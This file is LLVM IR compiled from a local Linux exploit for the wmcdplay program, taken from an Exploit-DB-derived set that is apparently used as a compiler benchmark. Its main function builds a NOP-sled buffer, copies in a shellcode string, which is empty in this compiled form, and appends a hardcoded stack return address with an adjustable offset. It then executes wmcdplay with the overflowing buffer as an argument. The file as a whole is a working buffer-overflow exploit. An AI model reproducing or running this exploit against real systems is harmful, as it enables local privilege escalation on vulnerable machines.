; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19802.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19802.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [24 x i8] c"/usr/X11R6/bin/wmcdplay\00", align 1
@.str.1 = private unnamed_addr constant [3 x i8] c"-f\00", align 1
@.str.2 = private unnamed_addr constant [9 x i8] c"-display\00", align 1
@.str.3 = private unnamed_addr constant [4 x i8] c"0:0\00", align 1
@buflen = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [81 x i8] c"You can also add an offset to the commandline. 40 worked for me on the console.\0A\00", align 1
@shell = common dso_local global i8* null, align 8
@.str.5 = private unnamed_addr constant [107 x i8] c"Get the real deal at http://www.cs.uni-potsdam.de/homepages/students/linuxer\0ARespect other users privacy!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [5 x i8*], align 16
  %7 = alloca i8*, align 8
  %8 = alloca i64, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = bitcast [5 x i8*]* %6 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %12, i8 0, i64 40, i1 false)
  %13 = bitcast i8* %12 to [5 x i8*]*
  %14 = getelementptr inbounds [5 x i8*], [5 x i8*]* %13, i32 0, i32 0
  store i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str, i32 0, i32 0), i8** %14, align 16
  %15 = getelementptr inbounds [5 x i8*], [5 x i8*]* %13, i32 0, i32 1
  store i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i32 0, i32 0), i8** %15, align 8
  %16 = getelementptr inbounds [5 x i8*], [5 x i8*]* %13, i32 0, i32 2
  store i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.2, i32 0, i32 0), i8** %16, align 16
  %17 = getelementptr inbounds [5 x i8*], [5 x i8*]* %13, i32 0, i32 3
  store i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.3, i32 0, i32 0), i8** %17, align 8
  %18 = load i32, i32* @buflen, align 4
  %19 = add nsw i32 %18, 10
  %20 = zext i32 %19 to i64
  %21 = call i8* @llvm.stacksave()
  store i8* %21, i8** %7, align 8
  %22 = alloca i8, i64 %20, align 16
  store i64 %20, i64* %8, align 8
  store i32 0, i32* %9, align 4
  store i32 0, i32* %10, align 4
  store i32 -1073743978, i32* %11, align 4
  %23 = trunc i64 %20 to i32
  %24 = call i32 @memset(i8* %22, i32 0, i32 %23)
  %25 = load i32, i32* @buflen, align 4
  %26 = call i32 @memset(i8* %22, i32 144, i32 %25)
  %27 = load i32, i32* %4, align 4
  %28 = icmp sgt i32 %27, 1
  br i1 %28, label %29, label %38

29:                                               ; preds = %2
  %30 = load i8**, i8*** %5, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 1
  %32 = load i8*, i8** %31, align 8
  %33 = call i64 @atoi(i8* %32)
  %34 = load i32, i32* %11, align 4
  %35 = sext i32 %34 to i64
  %36 = add nsw i64 %35, %33
  %37 = trunc i64 %36 to i32
  store i32 %37, i32* %11, align 4
  br label %40

38:                                               ; preds = %2
  %39 = call i32 @printf(i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.4, i64 0, i64 0))
  br label %40

40:                                               ; preds = %38, %29
  %41 = load i32, i32* @buflen, align 4
  %42 = load i8*, i8** @shell, align 8
  %43 = call i32 @strlen(i8* %42)
  %44 = sub nsw i32 %41, %43
  %45 = sub nsw i32 %44, 4
  store i32 %45, i32* %9, align 4
  br label %46

46:                                               ; preds = %61, %40
  %47 = load i32, i32* %9, align 4
  %48 = load i32, i32* @buflen, align 4
  %49 = sub nsw i32 %48, 4
  %50 = icmp slt i32 %47, %49
  br i1 %50, label %51, label %64

51:                                               ; preds = %46
  %52 = load i8*, i8** @shell, align 8
  %53 = load i32, i32* %10, align 4
  %54 = add nsw i32 %53, 1
  store i32 %54, i32* %10, align 4
  %55 = sext i32 %53 to i64
  %56 = getelementptr inbounds i8, i8* %52, i64 %55
  %57 = load i8, i8* %56, align 1
  %58 = load i32, i32* %9, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds i8, i8* %22, i64 %59
  store i8 %57, i8* %60, align 1
  br label %61

61:                                               ; preds = %51
  %62 = load i32, i32* %9, align 4
  %63 = add nsw i32 %62, 1
  store i32 %63, i32* %9, align 4
  br label %46

64:                                               ; preds = %46
  %65 = load i32, i32* %11, align 4
  %66 = sext i32 %65 to i64
  %67 = load i32, i32* %9, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds i8, i8* %22, i64 %68
  %70 = bitcast i8* %69 to i64*
  store i64 %66, i64* %70, align 1
  %71 = call i32 @printf(i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.5, i64 0, i64 0))
  %72 = getelementptr inbounds [5 x i8*], [5 x i8*]* %6, i64 0, i64 0
  %73 = load i8*, i8** %72, align 16
  %74 = getelementptr inbounds [5 x i8*], [5 x i8*]* %6, i64 0, i64 0
  %75 = load i8*, i8** %74, align 16
  %76 = getelementptr inbounds [5 x i8*], [5 x i8*]* %6, i64 0, i64 1
  %77 = load i8*, i8** %76, align 8
  %78 = getelementptr inbounds [5 x i8*], [5 x i8*]* %6, i64 0, i64 2
  %79 = load i8*, i8** %78, align 16
  %80 = getelementptr inbounds [5 x i8*], [5 x i8*]* %6, i64 0, i64 3
  %81 = load i8*, i8** %80, align 8
  %82 = call i32 @execl(i8* %73, i8* %75, i8* %77, i8* %22, i8* %79, i8* %81, i32 0)
  store i32 0, i32* %3, align 4
  %83 = load i8*, i8** %7, align 8
  call void @llvm.stackrestore(i8* %83)
  %84 = load i32, i32* %3, align 4
  ret i32 %84
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #1

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

declare dso_local i32 @memset(i8*, i32, i32) #3

declare dso_local i64 @atoi(i8*) #3

declare dso_local i32 @printf(i8*) #3

declare dso_local i32 @strlen(i8*) #3

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i8*, i8*, i32) #3

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
